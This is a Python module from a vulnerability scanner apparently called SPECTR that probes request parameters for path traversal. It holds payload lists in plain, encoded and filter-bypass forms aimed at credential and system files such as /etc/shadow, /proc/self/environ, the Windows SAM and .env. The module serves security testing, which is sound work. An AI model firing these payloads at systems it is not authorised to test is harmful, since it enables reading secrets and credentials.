"""
Path Traversal detector for SPECTR vulnerability scanner
"""

from typing import Dict, List, Any, Optional
from utils.http_client import HTTPClient
from core.payloads import PayloadDatabase
from core.analyzer import ResponseAnalyzer

class PathTraversalDetector:
    """Path Traversal vulnerability detector"""
    
    def __init__(self, http_client: HTTPClient, payloads: PayloadDatabase):
        self.http_client = http_client
        self.payloads = payloads
        self.analyzer = ResponseAnalyzer()
    
    def scan(self, url: str, method: str, params: Dict[str, Any], 
             headers: Optional[Dict[str, str]] = None, verbose: bool = False) -> List[Dict[str, Any]]:
        """Scan for path traversal vulnerabilities"""
        
        results = []
        traversal_payloads = self.payloads.get_payloads('traversal')
        
        if not params:
            if verbose:
                print("   ℹ️  No parameters to test for path traversal")
            return results
        
        # Test each parameter for path traversal
        for param_name, param_value in params.items():
            if verbose:
                print(f"   🔍 Testing parameter '{param_name}' for path traversal")
            
            # Test basic traversal
            basic_results = self._test_basic_traversal(
                url, method, params, param_name, headers, verbose
            )
            results.extend(basic_results)
            
            # Test file access
            file_results = self._test_file_access(
                url, method, params, param_name, headers, verbose
            )
            results.extend(file_results)
            
            # Test encoded traversal
            encoded_results = self._test_encoded_traversal(
                url, method, params, param_name, headers, verbose
            )
            results.extend(encoded_results)
        
        if verbose and results:
            print(f"   ✅ Found {len(results)} potential path traversal vulnerabilities")
        
        return results
    
    def _test_basic_traversal(self, url: str, method: str, params: Dict[str, Any], 
                             param_name: str, headers: Optional[Dict[str, str]] = None, 
                             verbose: bool = False) -> List[Dict[str, Any]]:
        """Test for basic path traversal vulnerabilities"""
        
        results = []
        basic_payloads = [
            "../", "../../", "../../../", "../../../../",
            "../../../../../", "../../../../../../",
            "../../../../../../../", "../../../../../../../../",
            "..\\", "..\\..\\", "..\\..\\..\\", "..\\..\\..\\..\\",
            "....//", "....\\\\", "..../", "....\\",
            "....//....//", "....\\\\....\\\\",
        ]
        
        for payload in basic_payloads:
            response = self.http_client.test_payload(
                url=url, method=method, params=params, payload=payload,
                target_param=param_name, headers=headers, verbose=verbose
            )
            
            if response:
                analysis = self.analyzer.analyze_traversal_response(response, payload)
                if analysis:
                    results.append({
                        'type': 'traversal',
                        'parameter': param_name,
                        'payload': payload,
                        'method': analysis.get('method', 'basic'),
                        'evidence': analysis.get('evidence', ''),
                        'response_code': analysis.get('response_code', 0),
                        'pattern_match': analysis.get('pattern_match', '')
                    })
                    
                    if verbose:
                        print(f"   🔴 Path traversal vulnerability found: {analysis.get('evidence', '')}")
        
        return results
    
    def _test_file_access(self, url: str, method: str, params: Dict[str, Any], 
                         param_name: str, headers: Optional[Dict[str, str]] = None, 
                         verbose: bool = False) -> List[Dict[str, Any]]:
        """Test for file access through path traversal"""
        
        results = []
        file_payloads = [
            # Unix/Linux files
            "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
            "../../../../etc/passwd", "../../../../../etc/passwd",
            "../etc/hosts", "../../etc/hosts", "../../../etc/hosts",
            "../etc/group", "../../etc/group", "../../../etc/group",
            "../etc/shadow", "../../etc/shadow", "../../../etc/shadow",
            "../proc/version", "../../proc/version", "../../../proc/version",
            "../proc/self/environ", "../../proc/self/environ",
            
            # Windows files
            "..\\windows\\system32\\drivers\\etc\\hosts",
            "..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "..\\windows\\system32\\config\\sam",
            "..\\..\\windows\\system32\\config\\sam",
            "..\\windows\\win.ini", "..\\..\\windows\\win.ini",
            "..\\windows\\system.ini", "..\\..\\windows\\system.ini",
            "..\\boot.ini", "..\\..\\boot.ini",
            
            # Application files
            "../config/database.yml", "../../config/database.yml",
            "../config/config.php", "../../config/config.php",
            "../wp-config.php", "../../wp-config.php",
            "../.env", "../../.env", "../../../.env",
            "../.htaccess", "../../.htaccess",
            "../web.config", "../../web.config",
            "../application.properties", "../../application.properties",
            
            # Null byte injection
            "../etc/passwd%00", "../../etc/passwd%00",
            "../etc/passwd%00.txt", "../../etc/passwd%00.txt",
            "../windows/win.ini%00", "../../windows/win.ini%00",
        ]
        
        for payload in file_payloads:
            response = self.http_client.test_payload(
                url=url, method=method, params=params, payload=payload,
                target_param=param_name, headers=headers, verbose=verbose
            )
            
            if response:
                analysis = self.analyzer.analyze_traversal_response(response, payload)
                if analysis:
                    results.append({
                        'type': 'traversal',
                        'parameter': param_name,
                        'payload': payload,
                        'method': analysis.get('method', 'file_access'),
                        'evidence': analysis.get('evidence', ''),
                        'response_code': analysis.get('response_code', 0),
                        'file_type': analysis.get('file_type', 'unknown')
                    })
                    
                    if verbose:
                        print(f"   🔴 File access via path traversal found: {analysis.get('evidence', '')}")
        
        return results
    
    def _test_encoded_traversal(self, url: str, method: str, params: Dict[str, Any], 
                               param_name: str, headers: Optional[Dict[str, str]] = None, 
                               verbose: bool = False) -> List[Dict[str, Any]]:
        """Test for encoded path traversal vulnerabilities"""
        
        results = []
        encoded_payloads = [
            # URL encoded
            "%2e%2e%2f", "%2e%2e%5c", "%2e%2e/", "..%2f", "..%5c",
            "%2e%2e%2f%2e%2e%2f", "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
            "%2e%2e%5c%2e%2e%5c", "%2e%2e%5c%2e%2e%5c%2e%2e%5c",
            
            # Double URL encoded
            "%252e%252e%252f", "%252e%252e%255c",
            "%252e%252e%252f%252e%252e%252f",
            "%252e%252e%255c%252e%252e%255c",
            
            # Unicode encoded
            "%c0%ae%c0%ae%c0%af", "%c1%9c%c1%9c%c1%9c",
            "..%c0%af", "..%c1%9c", "..%c0%2f", "..%c1%5c",
            
            # Mixed encoding
            "..%252f", "..%c0%af", "..%c1%9c",
            "%2e%2e%252f", "%2e%2e%c0%af",
            
            # With file targets
            "%2e%2e%2fetc%2fpasswd", "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%252e%252e%252fetc%252fpasswd",
            "%2e%2e%5cwindows%5cwin.ini",
            "%252e%252e%255cwindows%255cwin.ini",
        ]
        
        for payload in encoded_payloads:
            response = self.http_client.test_payload(
                url=url, method=method, params=params, payload=payload,
                target_param=param_name, headers=headers, verbose=verbose
            )
            
            if response:
                analysis = self.analyzer.analyze_traversal_response(response, payload)
                if analysis:
                    results.append({
                        'type': 'traversal',
                        'parameter': param_name,
                        'payload': payload,
                        'method': analysis.get('method', 'encoded'),
                        'evidence': analysis.get('evidence', ''),
                        'response_code': analysis.get('response_code', 0),
                        'encoding_type': self._detect_encoding_type(payload)
                    })
                    
                    if verbose:
                        print(f"   🔴 Encoded path traversal vulnerability found: {analysis.get('evidence', '')}")
        
        return results
    
    def _detect_encoding_type(self, payload: str) -> str:
        """Detect the type of encoding used in the payload"""
        if "%252e" in payload.lower():
            return "double_url_encoded"
        elif "%2e" in payload.lower():
            return "url_encoded"
        elif "%c0" in payload.lower() or "%c1" in payload.lower():
            return "unicode_encoded"
        elif "..%c" in payload.lower():
            return "mixed_encoded"
        else:
            return "unknown"
    
    def _test_filter_bypass(self, url: str, method: str, params: Dict[str, Any], 
                           param_name: str, headers: Optional[Dict[str, str]] = None, 
                           verbose: bool = False) -> List[Dict[str, Any]]:
        """Test for filter bypass techniques"""
        
        results = []
        bypass_payloads = [
            # Filter bypass attempts
            "....//", "....\\\\", "..../", "....\\",
            "....//....//", "....\\\\....\\\\",
            "..../....//", "....\\....\\\\",
            
            # Case variations
            "../ETC/PASSWD", "../../ETC/PASSWD",
            "../Windows/Win.ini", "../../Windows/Win.ini",
            "../WINDOWS/SYSTEM32/DRIVERS/ETC/HOSTS",
            
            # Space and special character insertion
            "../ etc/passwd", "../../ etc/passwd",
            "../etc /passwd", "../../etc /passwd",
            "../etc/ passwd", "../../etc/ passwd",
            "../etc/pass wd", "../../etc/pass wd",
            
            # Repetition
            "....//....//....//", "....\\\\....\\\\....\\\\",
            "..../..../..../", "....\\....\\....\\",
        ]
        
        for payload in bypass_payloads:
            response = self.http_client.test_payload(
                url=url, method=method, params=params, payload=payload,
                target_param=param_name, headers=headers, verbose=verbose
            )
            
            if response:
                analysis = self.analyzer.analyze_traversal_response(response, payload)
                if analysis:
                    results.append({
                        'type': 'traversal',
                        'parameter': param_name,
                        'payload': payload,
                        'method': analysis.get('method', 'filter_bypass'),
                        'evidence': analysis.get('evidence', ''),
                        'response_code': analysis.get('response_code', 0),
                        'bypass_type': 'filter_bypass'
                    })
                    
                    if verbose:
                        print(f"   🔴 Filter bypass path traversal found: {analysis.get('evidence', '')}")
        
        return results